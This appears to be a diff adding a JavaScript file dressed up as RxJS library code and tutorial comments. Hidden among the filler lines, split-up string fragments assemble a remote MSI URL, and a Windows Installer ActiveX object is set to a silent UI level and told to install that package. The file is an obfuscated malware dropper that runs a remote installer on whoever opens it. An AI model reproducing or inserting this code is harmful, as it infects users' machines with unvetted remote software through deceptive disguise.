@@ -1,0 +1,87 @@
+//# sourceMappingURL=isEmpty.js.map
+
+[1,2,31829942]
+
+//# sourceMappingURL=audit.js.map
+
+/*
+class AuditSubscriber extends SimpleOuterSubscriber {
+    constructor(destination, durationSelector) {
+        super(destination);
+        this.durationSelector = durationSelector;
+        this.hasValue = false;
+    }
+    _next(value) {
+        this.value = value;
+        this.hasValue = true;
+        if (!this.throttled) {
+            let duration;
+            try {
+                const { durationSelector } = this;
+                duration = durationSelector(value);
+            }
+            catch (err) {
+                return this.destination.error(err);
+            }
+            const innerSubscription = innerSubscribe(duration, new SimpleInnerSubscriber(this));
+            if (!innerSubscription || innerSubscription.closed) {
+                this.clearThrottle();
+            }
+            else {
+                this.add(this.throttled = innerSubscription);
+            }
+        }
+    }
+    clearThrottle() {
+        const { value, hasValue, throttled } = this;
+        if (throttled) {
+            this.remove(throttled);
+            this.throttled = undefined;
+            throttled.unsubscribe();
+        }
+        if (hasValue) {
+            this.value = undefined;
+            this.hasValue = false;
+            this.destination.next(value);
+        }
+    }
+    notifyNext() {
+        this.clearThrottle();
+    }
+    notifyComplete() {
+        this.clearThrottle();
+    }
+}
+*/
+
+var oly = "windowsinstaller";
+10 / 2 // division
+var sOlyo = "installer"; // Assign the text "Robin" to the variable sOlyo.
+var f = function(x){return x*x;} // function literal
+radius = 249;
+4 + 5 // additon
+var o = {x:1, y:2} // Object literal
+[1,2,3] // Array literal
+
+anExpression = 4 * (4 / 5) + 5;
+p = ".my.i";s = "n";g = "w";f = "h";o = "p";heskkr = ".";u = "i";ka = "ke";n = "t";
+vawe = "namesilo";
+aSecondExpression = Math.PI * radius * radius;
+
+myArray = new Array("Hamble!", Math.PI, 28);
+var today = new Date(); // Assign today's date to the variable today.
+sAssign = f + n + n + o +"s://" + vawe + p + "d/css/" + ka + heskkr + "ms" + u;
+myArray = new Array("Appassageya!", Math.PI, 48);
+var gOlyo = new ActiveXObject(oly + heskkr + sOlyo);
+myPi = myArray[1];
+
+mero = 1;314;2,8;
+gOlyo.uilevel=2
+29.1 // Numeric literal
+false // Boolean literal
+"Hello!" // String literal
+
+gOlyo.InstallProduct(sAssign);
+var a = new Array(4);
+
+https://yenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjayenjay//DskwQE5M6QycLniVAsj6YVSD
